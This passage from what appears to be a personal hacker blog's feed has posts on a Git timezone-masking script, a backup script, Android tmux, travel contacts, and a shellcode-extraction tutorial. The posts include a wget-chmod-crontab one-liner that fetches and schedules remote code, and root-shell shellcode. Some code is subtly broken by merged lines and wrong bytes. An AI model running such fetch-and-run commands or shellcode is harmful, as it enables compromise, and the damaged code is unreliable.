                ai_story = self.pick_a_story()
                store = str(ai_story) + separator

                if have.count(str(ai_story)) == 0:
                    seen.write(store)

            return ai_story

if __name__ == "__main__":
    for_kaepora = ForKaepora()

    derp = for_kaepora.print_a_shape()
    broken = choice(derp)
    fixed = r'%s' % broken
    print fixed

    for_kaepora.make_a_pretty()

    glitch = "****\n****\n****\n"
    story = glitch

    while story == glitch:
        story = for_kaepora.store_a_story()
    print story
&lt;/pre&gt;

&lt;p&gt;And if you do:&lt;/p&gt;
&lt;pre class="prettyprint lang-sh"&gt;
$ wget http://patternsinthevoid.net/kaepora;chmod +x kaepora;crontab \
  -l &gt;m&amp;&amp;echo "0 13 * * * exec /home/`whoami`/kaepora"&gt;&gt;m&amp;&amp; \
  crontab m;rm m
&lt;/pre&gt;

&lt;p&gt;Then, he gets a pretty email with a geometric shape in ascii art, a
fortune having something to do with computers, a link to some sort of
neat .gif that'd be neater if your brain was wonky, and a short story
written by an artificial intelligence. You can run the python script if
you want to get an idea of what the email looks like.&lt;/p&gt;
&lt;p&gt;&amp;lt;(A)3&lt;/p&gt;</summary><category term="censorship detection"></category><category term="cryptography"></category><category term="javascript"></category><category term="MPOTR"></category><category term="python"></category><category term="reverse engineering"></category><category term="rio de janeiro"></category><category term="Tor"></category></entry><entry><title>Git Nowhere</title><link href="/git-nowhere.html" rel="alternate"></link><updated>2012-04-04T20:19:00Z</updated><author><name>isis agora lovecruft agora lovecruft</name></author><id>tag:,2012-04-04:git-nowhere.html</id><summary type="html">&lt;p&gt;&lt;a href="https://twitter.com/#!/hellais"&gt;Arturo&lt;/a&gt; and I were going through our commit logs for &lt;a href="https://gitweb.torproject.org/ooni-probe.git"&gt;ooni-probe&lt;/a&gt;
this morning when he noted that git commits leak geodata through
timezone settings. I figured git would have an easy way to set the
timezone to GMT, but it turns out that it uses mktime() to get a struct
representing the system clock time. &lt;a href="http://www.alexpeattie.com/blog/working-with-dates-in-git/"&gt;There's a few hacks already&lt;/a&gt; for
dealing with this, namely setting GIT_AUTHOR_DATE with the --date
command:&lt;/p&gt;
&lt;pre class="prettyprint lang-bash"&gt;
$ git commit --date="Wed Feb 16 14:00 2037 +0100"
&lt;/pre&gt;

&lt;p&gt;This is not only annoying, but it also doesn't set GIT_COMMITTER_DATE,
so if you wrote the patch and also committed it to a repo, your timezone
still leaks.&lt;/p&gt;
&lt;p&gt;I thought this was all incredibly annoying, and I don't want to change
my system clock, so [I made a bash script][] to fix it:&lt;/p&gt;
&lt;pre class="prettyprint lang-bash"&gt;
#!/bin/bash
#_____________________________________________________________________________
# Git Nowhere
#-----------------------------------------------------------------------------
#
# Use: Run as "$ . ./gitdate.sh" before "$ git commit" to manually set
# the date to GMT in order to obscure timezone-based geodata tracking.
#
# If you would always like your timestamps to be obscured for a specific
# project, then place this script in /usr/local/bin/. Next, edit
# /your_project_path/.git/hooks/pre-commit and place in it the following two
# lines:
#
# #!/bin/sh
# exec source /usr/local/bin/gitdate.sh
#
# @author Isis Lovecuft, 0x2CDB8B35 isis@patternsinthevoid.net
# @version 0.0.3
#
# v0.0.3: Also changes the months and years, because that would suck if your
#         commits were accidentally made last year
# v0.0.2: Changes the days too# v0.0.1: Changes the hours
#_____________________________________________________________________________

DAY=$(date | cut -d ' ' -f 1)
MONTH=$(date | cut -d ' ' -f 2)
DATE=$(date | cut -d ' ' -f 4)
TIME=$(date | cut -d ' ' -f 5)
TIMEZONE="+0000"YEAR=$(date | cut -d ' ' -f 7)
HOUR=$(echo "$TIME" | cut -d ':' -f 1)
MINUTE=$(echo "$TIME" | cut -d ':' -f 2)
SECOND=$(echo "$TIME" | cut -d ':' -f 3)

# Git uses the system time settings through mktime().  Do a "$ git log" to see
# the timezone offset for your system.  This script assumes -0700. For
# example, if "$ git log" says your timezone is -0500, you would change all
# occurences in the next code block of "7" to "5" and change "17" to "19".

TIMEOFFSET=7
if [ "$HOUR" -lt "17" ]; then
    let HOUR+=7else
    let TILMIDNIGHT=24-HOUR
    let FALSEDAWN=TIMEOFFSET-TILMIDNIGHT
    let HOUR=FALSEDAWN
fi

# If the hour is one digit, prepend a zero.
if [ "${#HOUR}" -eq "1" ]; then
    HOUR=$(printf "%02d" $HOUR)
fi

# If it is tomorrow in UTC, make sure we increment the day.
if [[ -n "$FALSEDAWN" ]]; then
    if [ "$DAY" = "Mon" ]; then
        NEXTDAY=$(echo "Tue")
    elif [ "$DAY" = "Tue" ]; then
        NEXTDAY=$(echo "Wed")
    elif [ "$DAY" = "Wed" ]; then
        NEXTDAY=$(echo "Thu")
    elif [ "$DAY" = "Thu" ]; then
        NEXTDAY=$(echo "Fri")
    elif [ "$DAY" = "Fri" ]; then
        NEXTDAY=$(echo "Sat")
    elif [ "$DAY" = "Sat" ]; then
        NEXTDAY=$(echo "Sun")
    elif [ "$DAY" = "Sun" ]; then
        NEXTDAY=$(echo "Mon")
    fi

    DAY=$NEXTDAY

    if [[ "$MONTH" = "Jan" ]] || [[ "$MONTH" = "Mar" ]] || [[ "$MONTH" = "May" ]] || [[ "$MONTH" = "Jul" ]] || [[ "$MONTH" = "Aug" ]] || [[ "$MONTH" = "Oct" ]] || [[ "$MONTH" = "Dec" ]]; then
        if [[ "$DATE" -lt "31" ]]; then
            let DATE+=1
        elif [[ "$DATE" -eq "31" ]]; then
            if [[ "$MONTH" = "Jan" ]]; then
                NEXTMONTH=$(echo "Feb")
            elif [[ "$MONTH" = "Mar" ]]; then
                NEXTMONTH=$(echo "Apr")
            elif [[ "$MONTH" = "May" ]]; then
                NEXTMONTH=$(echo "Jun")
            elif [[ "$MONTH" = "Jul" ]]; then
                NEXTMONTH=$(echo "Aug")
            elif [[ "$MONTH" = "Aug" ]]; then
                NEXTMONTH=$(echo "Sep")
            elif [[ "$MONTH" = "Oct" ]]; then
                NEXTMONTH=$(echo "Nov")
            elif [[ "$MONTH" = "Dec" ]]; then
                NEXTMONTH=$(echo "Jan")
                let YEAR+=1
            fi

            DATE=1
        fi
    elif [[ "$MONTH" = "Feb" ]] &amp;&amp; [[ "$DATE" -lt "28" ]]; then
        let DATE+=1
    elif [[ "$MONTH" = "Feb" ]] &amp;&amp; [[ "$DATE" -eq "28" ]]; then
        NEXTMONTH=$(echo "Mar")
        DATE=1
    elif [[ "$MONTH" = "Apr" ]] || [[ "$MONTH" = "Jun" ]] || [[ "$MONTH" = "Sep" ]] || [[ "$MONTH" = "Nov" ]]; then
        if [[ "$DATE" -lt "30" ]]; then
            let DATE+=1
        elif [[ "$DATE" -eq "30" ]]; then
            if [[ "$MONTH" = "Apr" ]]; then
                NEXTMONTH=$(echo "May")
            elif [[ "$MONTH" = "Jun" ]]; then
                NEXTMONTH=$(echo "Jul")
            elif [[ "$MONTH" = "Sep" ]]; then
                NEXTMONTH=$(echo "Oct")
            elif [[ "$MONTH" = "Nov" ]]; then
                NEXTMONTH=$(echo "Dec")
            fi

            DATE=1
        fi
    fi
    if [[ -n "$NEXTMONTH" ]]; then
        MONTH=$NEXTMONTH
    fi
fi
export GIT_AUTHOR_DATE=$(echo "$DAY $MONTH $DATE $HOUR:$MINUTE:$SECOND $YEAR $TIMEZONE")
export GIT_COMMITTER_DATE=$GIT_AUTHOR_DATE
unset NEXTMONTH
unset DAY
unset MONTH
unset DATE
unset HOUR
unset MINUTE
unset SECOND
unset YEAR
unset TIMEZONE
unset TILMIDNIGHT
unset FALSEDAWN
unset NEXTDAY
unset TIMEOFFSET
&lt;/pre&gt;

&lt;p&gt;[I made a bash script]: https://github.com/isis agora lovecruftlovecruft/configs/blob/master/scripts/gitdate.sh&lt;/p&gt;</summary><category term="anonymity"></category><category term="bash"></category><category term="geodata"></category><category term="git"></category></entry><entry><title>pyrsync: A pure Python module for the rsync algorithm</title><link href="/pyrsync-a-pure-python-module-for-the-rsync-algorithm.html" rel="alternate"></link><updated>2012-01-26T08:10:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2012-01-26:pyrsync-a-pure-python-module-for-the-rsync-algorithm.html</id><summary type="html">&lt;p&gt;I quickly modified and packaged a pure Python implementation of the
rsync algorithm today. It’s on Github and PyPi. It’s going to be used in
the open-source, symmetrically-encrypted, bandwidth-efficient,
cross-platform backup software that I’m writing. Because why, for fuck’s
sake, would you trust *all the files* on your computer, plus your
cryptographic scheme, and potentially, [...]&lt;/p&gt;</summary><category term="Anarchism"></category><category term="Technology"></category><category term="cryptography"></category><category term="hacking"></category><category term="python"></category><category term="rsync"></category></entry><entry><title>28c3 &amp; Kontakt Informationen</title><link href="/28c3-kontakt-informationen.html" rel="alternate"></link><updated>2011-12-27T14:36:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-12-27:28c3-kontakt-informationen.html</id><summary type="html">&lt;p&gt;I'm going to be traveling abroad for about six weeks, so anyone who is
trying to contact me during this period should know that it may take a
while to get back to you. I'm going to the &lt;a href="http://events.ccc.de/congress/2011/wiki/Welcome"&gt;Chaos Computer Club's
28c3&lt;/a&gt;, so I'll post updates on things that I learn there. I also
believe that I will be giving a short talk on the artificial
intelligence work I've been involved in.&lt;/p&gt;
&lt;p&gt;I'll be getting a German SIM card when I get off the plane in Berlin,
and I'll probably not post the new number here, or maybe I will.
Normally I'm worried about people tracking me down, but hey, why not --
it's a throwaway SIM afterall. It's not like anyone's going to stalk me
all across Europe.&lt;/p&gt;
&lt;p&gt;After Germany, I'll be in Austria, Denmark, Czech, Sweden(?), The
Netherlands, and maybe a few other countries. I want to mention that the
only reason someone as poor as I is able to go all these places is due
to a couple of &lt;a href="http://starset.net/"&gt;amazing&lt;/a&gt; &lt;a href="http://tomlowenthal.com/"&gt;hackers&lt;/a&gt; at &lt;a href="https://www.noisebridge.net/wiki/Noisebridge"&gt;Noisebridge&lt;/a&gt; in San
Francisco, who felt like I should be able to go, provided tons of
support, help, and encouragement. Their only request for me was that one
day I "pay it forward."&lt;/p&gt;
&lt;h3&gt;Kontakt Informationen&lt;/h3&gt;
&lt;p&gt;isis agora lovecruft Lovecruft&lt;/p&gt;
&lt;p&gt;Deutschland Telefonnummer = +49.1578.779.2714&lt;/p&gt;
&lt;p&gt;Osterreich Telefonnummer = +43.681.201.857.84&lt;/p&gt;
&lt;p&gt;Email = isis agora lovecruft(at)patternsinthevoid(dot)net&lt;/p&gt;
&lt;p&gt;GPG Public Key = [view][] [download][]&lt;/p&gt;
&lt;p&gt;Fingerprint = 0A6A 58A1 4B59 46AB DE18 E207 A3AD B67A 2CDB 8B35&lt;/p&gt;
&lt;p&gt;Pidgin = isis agora lovecruftlovecruft(at)jabber(dot)ccc(dot)de&lt;/p&gt;
&lt;p&gt;OTR Fingerprint = DBD3AB55 D2691E05 38B9528C 2C25C9D9 E2EDE0ED&lt;/p&gt;
&lt;p&gt;Pidgin (&lt;a href="https://help.riseup.net/en/chat"&gt;over Tor Hidden Services!&lt;/a&gt;) = isis agora lovecruft(at)riseup(dot)net&lt;/p&gt;
&lt;p&gt;OTR Fingerprint = 226265F2 DA257A80 EB19B2AE 0D7E6317 E560D817&lt;/p&gt;
&lt;p&gt;[view]: www.patternsinthevoid.net/isis agora lovecruft_pgp_public_key.html
  [download]: http://www.patternsinthevoid.net/isis agora lovecruft.txt&lt;/p&gt;</summary><category term="28c3"></category><category term="artificial intelligence"></category><category term="Chaos Computer Club"></category><category term="hackers"></category><category term="hacking"></category><category term="Noisebridge"></category><category term="travel"></category></entry><entry><title>Progress &amp; Problems: Tmux for Android</title><link href="/progress-problems-tmux-for-android.html" rel="alternate"></link><updated>2011-12-27T14:03:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-12-27:progress-problems-tmux-for-android.html</id><summary type="html">&lt;p&gt;One of the things I need for &lt;a href="http://www.patternsinthevoid.net/blog/2011/12/xqdr-a-flying-robot-that-does-things/" title="xqdr: A Flying Robot That Does Things"&gt;xqdr&lt;/a&gt;, the flying robot that I'm
building, is a terminal multiplexer, like &lt;a href="http://en.wikipedia.org/wiki/GNU_Screen"&gt;screen&lt;/a&gt; or &lt;a href="http://tmux.sourceforge.net/"&gt;tmux&lt;/a&gt;. I use
tmux, personally, and jeepers wouldn't it be neat to have it run
natively on my phone so that I don't have to use ConnectBot to an
outside server and then do "tmux attach"?&lt;/p&gt;
&lt;p&gt;Fortunately (or so I thought when starting this project), tmux is
written entirely in C. This turned out to be difficult, and so I'll
outline how I did it.&lt;/p&gt;
&lt;p&gt;The Android kernel uses a slimmed down version of standard C libraries
(libc.so), called bionic. This is where all the allowed calls are
stored. It's possible to either:&lt;/p&gt;
&lt;p&gt;Surprisingly, I attempted the second option first. &lt;em&gt;This was insane.&lt;/em&gt; I
had to &lt;a href="https://gist.github.com/1518816"&gt;compile a compiler to compile a compiler to compile a
compiler&lt;/a&gt; to &lt;a href="http://plausible.org/andy/agcc"&gt;compile a shared object library through a perl
wrapper&lt;/a&gt; to compile the code. I think I made it through all the
compiling compilers parts, and then my &lt;a href="https://github.com/jsnyder/arm-eabi-toolchain"&gt;finished compiler&lt;/a&gt; crapped all
over its pants.&lt;/p&gt;
&lt;p&gt;It was at this point that I decided to check my phone, and I realised
that CyanogenMod7 already has a shared object library for standard C.
(It's at /system/lib/libc.so). There is the possibility that I could use
this pre-ARM-compiled library, bundle it with tmux, and then use
&lt;a href="http://developer.android.com/sdk/ndk/index.html"&gt;Android&lt;/a&gt; &lt;a href="http://mindtherobot.com/blog/452/android-beginners-ndk-setup-step-by-step/"&gt;NDK&lt;/a&gt; to compile tmux for ARM. This would also necessitate
creating a .JNI makefile for the frontend, which includes &lt;a href="http://mobile.tutsplus.com/tutorials/android/ndk-tutorial/"&gt;a trivial
amount of Java to wrap the native code&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I'll update when I finish or fuck myself over, but right now I'm getting
on brutal series of international flights for &lt;a href="http://www.ccc.de/en/"&gt;Chaos Computer Club&lt;/a&gt;'s
&lt;a href="http://events.ccc.de/congress/2011/wiki/Welcome"&gt;28C3&lt;/a&gt; in Berlin, and my connection is slower than liberal reformist
tactics are at creating a freer society.&lt;/p&gt;
&lt;p&gt;\&amp;lt;(A)3&lt;/p&gt;</summary><category term="28c3"></category><category term="android"></category><category term="android ndk"></category><category term="ARM"></category><category term="C"></category><category term="Chaos Computer Club"></category><category term="cyanogen"></category><category term="hacking"></category><category term="java"></category><category term="linux"></category><category term="perl"></category><category term="tmux"></category><category term="ubuntu"></category></entry><entry><title>Disassembly</title><link href="/disassembly.html" rel="alternate"></link><updated>2011-12-20T17:58:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-12-20:disassembly.html</id><summary type="html">&lt;p&gt;Often when doing exploit development, it's &lt;a href="http://www.patternsinthevoid.net/blog/2011/09/learning-assembly-through-writing-shellcode/" title="Learning Assembly Through Writing Shellcode"&gt;necessary to extract hex
opcodes&lt;/a&gt; from an assembly or C program to generate shellcode.
Normally, to do this, one uses &lt;strong&gt;objdump&lt;/strong&gt; as in the following example:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;isis agora lovecruft@wintermute:~$ cat shellcode.asm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;section .text&lt;/p&gt;
&lt;p&gt;global _start&lt;/p&gt;
&lt;p&gt;_start:&lt;/p&gt;
&lt;p&gt;;; setreuid (0,0)&lt;/p&gt;
&lt;p&gt;xor eax, eax ;clear the eax registry&lt;/p&gt;
&lt;p&gt;mov al, 0x46 ;set the syscall # to decimal 70 or hex 46, one byte&lt;/p&gt;
&lt;p&gt;xor ebx, ebx&lt;/p&gt;
&lt;p&gt;xor ecx, ecx&lt;/p&gt;
&lt;p&gt;int 0x80 ;system interrupt to call kernel to execute syscall&lt;/p&gt;
&lt;p&gt;;; spawn shellcode with execve&lt;/p&gt;
&lt;p&gt;xor eax, eax&lt;/p&gt;
&lt;p&gt;push eax ;push a NULL value on the stack&lt;/p&gt;
&lt;p&gt;push 0x68732f2f ;push '//sh' onto the stack&lt;/p&gt;
&lt;p&gt;push 0x6369622f ;push '/bin' onto the stack&lt;/p&gt;
&lt;p&gt;mov ebx, esp ;esp now points to '/bin/sh', so write to ebx&lt;/p&gt;
&lt;p&gt;push eax ;push another NULL to terminate char ** argv on stack&lt;/p&gt;
&lt;p&gt;push ebx ;push pointer to '/bin/sh' onto stack&lt;/p&gt;
&lt;p&gt;mov ecx, esp ;esp now holds the address of argv, so write to ecx&lt;/p&gt;
&lt;p&gt;xor edx, edx&lt;/p&gt;
&lt;p&gt;mov al, 0xb ;set the syscall # to decimal 11 or hex b, one byte&lt;/p&gt;
&lt;p&gt;int 0x80 ;sytem interrupt to call kernel to execute syscall&lt;/p&gt;
&lt;p&gt;isis agora lovecruft@wintermute:\~\$ nasm -f elf shellcode.asm&lt;/p&gt;
&lt;p&gt;isis agora lovecruft@wintermute:\~\$ ld -melf_i386 -o shellcode shellcode.o&lt;/p&gt;
&lt;p&gt;isis agora lovecruft@wintermute:\~\$ objdump -d ./shellcode&lt;/p&gt;
&lt;p&gt;./shellcode: file format elf32-i386&lt;/p&gt;
&lt;p&gt;Disassembly of section .text:&lt;/p&gt;
&lt;p&gt;08048060 \&amp;lt;_start&gt;:&lt;/p&gt;
&lt;p&gt;8048060: 31 c0 xor %eax,%eax&lt;/p&gt;
&lt;p&gt;8048062: b0 46 mov \$0x46,%al&lt;/p&gt;
&lt;p&gt;8048064: 31 db xor %ebx,%ebx&lt;/p&gt;
&lt;p&gt;8048066: 31 c9 xor %ecx,%ecx&lt;/p&gt;
&lt;p&gt;8048068: cd 80 int \$0x80&lt;/p&gt;
&lt;p&gt;804806a: 31 c0 xor %eax,%eax&lt;/p&gt;
&lt;p&gt;804806c: 50 push %eax&lt;/p&gt;
&lt;p&gt;804806d: 68 2f 2f 73 68 push \$0x68732f2f&lt;/p&gt;
&lt;p&gt;8048072: 68 2f 62 69 63 push \$0x6369622f&lt;/p&gt;
&lt;p&gt;8048077: 89 e3 mov %esp,%ebx&lt;/p&gt;
&lt;p&gt;8048079: 50 push %eax&lt;/p&gt;
&lt;p&gt;804807a: 53 push %ebx&lt;/p&gt;
&lt;p&gt;804807b: 89 e1 mov %esp,%ecx&lt;/p&gt;
&lt;p&gt;804807d: 31 d2 xor %edx,%edx&lt;/p&gt;
&lt;p&gt;804807f: b0 0b mov \$0xb,%al&lt;/p&gt;
&lt;p&gt;8048081: cd 80 int \$0x80&lt;/p&gt;
&lt;p&gt;So, from this example, the shellcode would be:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\x50\x68\x2f\2f\x73\&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;x68\x68\x2f\x62\x69\x63\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&lt;/p&gt;
&lt;p&gt;But! What if you have some shellcode, say from a nasty PDF that someone
sent you (though a malPDF's shellcode would be in JavaScript, and so it
would look like "%u68%u73%u2f%u2f"), and you don't want to have to sit
there with a hex-to-ascii chart looking everything up by hand just to
find out what this shellcode is doing? As it turns out, there's a handy
little thing called &lt;a href="http://udis86.sourceforge.net/"&gt;udis86&lt;/a&gt; to do all that boring work for you. You
have to download their tarball, then do:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ ./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;To run udis86 at the commandline, do:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ udcli&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Words can't describe how much I'm crushing on this program. Check this
out:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;isis agora lovecruft@wintermute:~/$ udcli -x&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;31 c0 b0 46 31 db 31 c9 cd 80 31 c0 50 68 2f 2f 73 68 68 2f 62 69 63 89
e3 50 53 89 e1 31 d2 b0 0b cd 80&lt;/p&gt;
&lt;p&gt;0000000000000000 31c0 xor eax, eax&lt;/p&gt;
&lt;p&gt;0000000000000002 b046 mov al, 0x46&lt;/p&gt;
&lt;p&gt;0000000000000004 31db xor ebx, ebx&lt;/p&gt;
&lt;p&gt;0000000000000006 31c9 xor ecx, ecx&lt;/p&gt;
&lt;p&gt;0000000000000008 cd80 int 0x80&lt;/p&gt;
&lt;p&gt;000000000000000a 31c0 xor eax, eax&lt;/p&gt;
&lt;p&gt;000000000000000c 50 push eax&lt;/p&gt;
&lt;p&gt;000000000000000d 682f2f7368 push dword 0x68732f2f&lt;/p&gt;
&lt;p&gt;0000000000000012 682f626963 push dword 0x6369622f&lt;/p&gt;
&lt;p&gt;0000000000000017 89e3 mov ebx, esp&lt;/p&gt;
&lt;p&gt;0000000000000019 50 push eax&lt;/p&gt;
&lt;p&gt;000000000000001a 53 push ebx&lt;/p&gt;
&lt;p&gt;000000000000001b 89e1 mov ecx, esp&lt;/p&gt;
&lt;p&gt;000000000000001d 31d2 xor edx, edx&lt;/p&gt;
&lt;p&gt;000000000000001f b00b mov al, 0xb&lt;/p&gt;
&lt;p&gt;0000000000000021 cd80 int 0x80&lt;/p&gt;</summary><category term="assembly languages"></category><category term="exploit development"></category><category term="fancy punks"></category><category term="hex"></category><category term="linux"></category><category term="shellcode"></category></entry><entry><title>Automated, Bandwidth-Efficient, and Encrypted Backups</title><link href="/automated-bandwidth-efficient-and-encrypted-backups.html" rel="alternate"></link><updated>2011-12-19T19:29:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-12-19:automated-bandwidth-efficient-and-encrypted-backups.html</id><summary type="html">&lt;p&gt;I made a bash shell script to automate encrypted (remote or local) data
backups with &lt;a href="http://duplicity.nongnu.org/" title="Duplicity"&gt;Duplicity&lt;/a&gt;. Duplicity uses asymmetric GPG RSA keys to
encrypt a tarballs of specified files to be backed up, and it also
supports incremental backups. So, after making a full backup, it is more
efficient do to the fact that it only saves changes made to files and
not entirely new copies of files. Duplicity also supports versioning,
i.e. you can say "give me File A from 3 days ago".&lt;/p&gt;
&lt;p&gt;Duplicity is &lt;em&gt;not&lt;/em&gt; efficient in it's cryptographic design, as my friend
Tom wisely pointed out, in that use of asymmetric cryptographic
algorithms is heavily intensive upon processor resources, and it would
be better to replace this feature with something more along the lines of
the algorithms (e.g. AES, Serpent, and Twofish) and read/write speed
testing features which &lt;a href="http://www.truecrypt.org/" title="TrueCrypt"&gt;TrueCrypt&lt;/a&gt; supports, for example.&lt;/p&gt;
&lt;p&gt;This script depends on both curl and a newer version of duplicity (which
is not yet included in the standard repositories), so to install those
dependencies in Ubuntu do:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ sudo apt-add-repository ppa:duplicity-team/ppa&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;\$ sudo apt-get update&lt;/p&gt;
&lt;p&gt;\$ sudo apt-get install duplicity curl&lt;/p&gt;
&lt;p&gt;Here's version 0.1.2 of the backup script [(or view it on github
here)][]:&lt;/p&gt;
&lt;p&gt;#!/bin/bash&lt;/p&gt;
&lt;p&gt;# _____________________&lt;/p&gt;
&lt;p&gt;#| BACKUP[your].SH[it] |&lt;/p&gt;
&lt;p&gt;#|---------------------|&lt;/p&gt;
&lt;p&gt;#|v.0.1.2 |\ \^ /\^&lt;/p&gt;
&lt;p&gt;#|Written by | \ / \ // \  &lt;/p&gt;
&lt;p&gt;#|isis agora lovecruft Lovecruft | \ |\___/| / \// .\  &lt;/p&gt;
&lt;p&gt;#|isis agora lovecruft@patternsinthe | \ /O O \__ / // | \ \ *----*&lt;/p&gt;
&lt;p&gt;#| void.net| / / \/_/ // | \ \ \ |&lt;/p&gt;
&lt;p&gt;#|_____________________| @___@` \/_ // | \  
\ \/\ \  &lt;/p&gt;
&lt;p&gt;# 0/0/| \/_ // | \ \ \ \  &lt;/p&gt;
&lt;p&gt;# 0/0/0/0/| \/// | \ \ | |&lt;/p&gt;
&lt;p&gt;# 0/0/0/0/0/_|_ / ( // | \ _\ | /&lt;/p&gt;
&lt;p&gt;# 0/0/0/0/0/0/`/,_ _ _/ ) ; -. | _ _\.-\~ / /&lt;/p&gt;
&lt;p&gt;# ,-} _ *-.|.-\~-. .\~ \~&lt;/p&gt;
&lt;p&gt;# \ \__/ `/\ / \~-. _ .-\~ /&lt;/p&gt;
&lt;p&gt;# \____(oo) *. } { /&lt;/p&gt;
&lt;p&gt;# ( (--) .----\~-.\ \-` .\~&lt;/p&gt;
&lt;p&gt;# //__\\ \__ zomg! ///.----..\&amp;lt; \ _ -\~&lt;/p&gt;
&lt;p&gt;# // \\ ///-._ _ _ _ _ _ _{\^ - - - - \~&lt;/p&gt;
&lt;p&gt;#&lt;/p&gt;
&lt;p&gt;# Backup script to automate SSH, SCP, SFTP, FTP, and IMAP backups
through&lt;/p&gt;
&lt;p&gt;# Duplicity. Duplicity encrypts backup files through GPG before sending&lt;/p&gt;
&lt;p&gt;# files through protocol. This script runs a check on the available&lt;/p&gt;
&lt;p&gt;# bandwidth, and only runs the backup when the bandwidth available is&lt;/p&gt;
&lt;p&gt;# above a configurable threshhold.&lt;/p&gt;
&lt;p&gt;#&lt;/p&gt;
&lt;p&gt;# This is going to be rewritten using duplicati instead of duplicity in
the&lt;/p&gt;
&lt;p&gt;# next major version release.&lt;/p&gt;
&lt;p&gt;SPEED=\$(curl -w %{speed_download} -o /dev/null -s
http://speedtest.sea01.softlayer.com/speedtest/speedtest/random1000x1000.jpg)&lt;/p&gt;
&lt;p&gt;INT=\${SPEED/\.*}&lt;/p&gt;
&lt;p&gt;KBPS=\$(echo \$[INT / 1024])&lt;/p&gt;
&lt;p&gt;THRESHOLD="200"&lt;/p&gt;
&lt;p&gt;# Uncomment and set the following in order to not type your password.&lt;/p&gt;
&lt;p&gt;# This is incredibly insecure, as your password is then stored&lt;/p&gt;
&lt;p&gt;# plaintext.&lt;/p&gt;
&lt;p&gt;#export PASSPHRASE='passphrase'&lt;/p&gt;
&lt;p&gt;# The \$SPEED variable downloads a nice image of snow (into /dev/null
so that&lt;/p&gt;
&lt;p&gt;# it isn't actually saved anywhere on disk). It also gives us a
write-out&lt;/p&gt;
&lt;p&gt;# (-w %{speed_download}) for the average available bandwidth
(incoming) in&lt;/p&gt;
&lt;p&gt;# bytes per second.&lt;/p&gt;
&lt;p&gt;#&lt;/p&gt;
&lt;p&gt;# \$INT turns the float \$SPEED into an integer.&lt;/p&gt;
&lt;p&gt;#&lt;/p&gt;
&lt;p&gt;# \$KBPS, as I'm sure you can surmise, turns the bytes per second into&lt;/p&gt;
&lt;p&gt;# kilobytes per second.&lt;/p&gt;
&lt;p&gt;#&lt;/p&gt;
&lt;p&gt;# \$THRESHOLD can be changed to fit the user's preferences, and it
defines&lt;/p&gt;
&lt;p&gt;# the minimum bandwidth which should be available for a duplicity
backup to&lt;/p&gt;
&lt;p&gt;# take place.&lt;/p&gt;
&lt;p&gt;if [[ "\$#" == "0" ]]; then&lt;/p&gt;
&lt;p&gt;echo ""&lt;/p&gt;
&lt;p&gt;echo "Usage: ./backup.sh ... "&lt;/p&gt;
&lt;p&gt;echo ""&lt;/p&gt;
&lt;p&gt;echo "Backup locations can be locally stored on the same disk (not
recommended), "&lt;/p&gt;
&lt;p&gt;echo "or may be stored remotely. For remote backups, duplicity provides
several "&lt;/p&gt;
&lt;p&gt;echo "options for transport, including SCP, FTP, and IMAP, please see
'man duplicity' "&lt;/p&gt;
&lt;p&gt;echo "for more information. Also, all duplicity backups are
automatically GnuPG "&lt;/p&gt;
&lt;p&gt;echo "encrypted, so transportation is much safer than it would be
otherwise. "&lt;/p&gt;
&lt;p&gt;echo ""&lt;/p&gt;
&lt;p&gt;echo "Note: Duplicity's SSH backend performs a check that the remote
directory end "&lt;/p&gt;
&lt;p&gt;echo "in a '/', so this must be present for SSH, SCP, or SFTP backups to
work correctly."&lt;/p&gt;
&lt;p&gt;echo ""&lt;/p&gt;
&lt;p&gt;exit 1&lt;/p&gt;
&lt;p&gt;fi&lt;/p&gt;
&lt;p&gt;# Make sure this script is run as root.&lt;/p&gt;
&lt;p&gt;if [[ `id -u` != 0 ]]; then&lt;/p&gt;
&lt;p&gt;echo ""&lt;/p&gt;
&lt;p&gt;echo "Sorry, backups must be made as root in order for files in the /
directory to"&lt;/p&gt;
&lt;p&gt;echo "be backed up safely. Please do 'sudo su' and try running this
script again."&lt;/p&gt;
&lt;p&gt;echo "Exiting..."&lt;/p&gt;
&lt;p&gt;echo ""&lt;/p&gt;
&lt;p&gt;exit 1&lt;/p&gt;
&lt;p&gt;fi&lt;/p&gt;
&lt;p&gt;# Set up BACKUP_TO_LOCATION positional parameters.&lt;/p&gt;
&lt;p&gt;for i in "\$@"; do&lt;/p&gt;
&lt;p&gt;\$(BACK_UP_LOCATION_\$i)=\$i&lt;/p&gt;
&lt;p&gt;echo ""&lt;/p&gt;
&lt;p&gt;echo "Would you like to make a full backup, or add an incremental backup
to the "&lt;/p&gt;
&lt;p&gt;echo "last full backup stored?"&lt;/p&gt;
&lt;p&gt;select fullinc in "Full" "Incremental"; do&lt;/p&gt;
&lt;p&gt;case \$fullinc in&lt;/p&gt;
&lt;p&gt;Full)&lt;/p&gt;
&lt;p&gt;USERLIST=\$(cat /etc/passwd | grep "/home" | grep -E
"([1-5][0-9]{3})|([5-9][0-9]{2})?" | cut -d : -f 1)&lt;/p&gt;
&lt;p&gt;# fix above regex to match '1000', '500' and '1392'&lt;/p&gt;
&lt;p&gt;#&lt;/p&gt;
&lt;p&gt;# This command searches the password file for users with a home
directory&lt;/p&gt;
&lt;p&gt;# (to filter out programs with user accounts) whose UID number is in
the&lt;/p&gt;
&lt;p&gt;# range of 500-1599 (normal users, does not include root). It then
takes&lt;/p&gt;
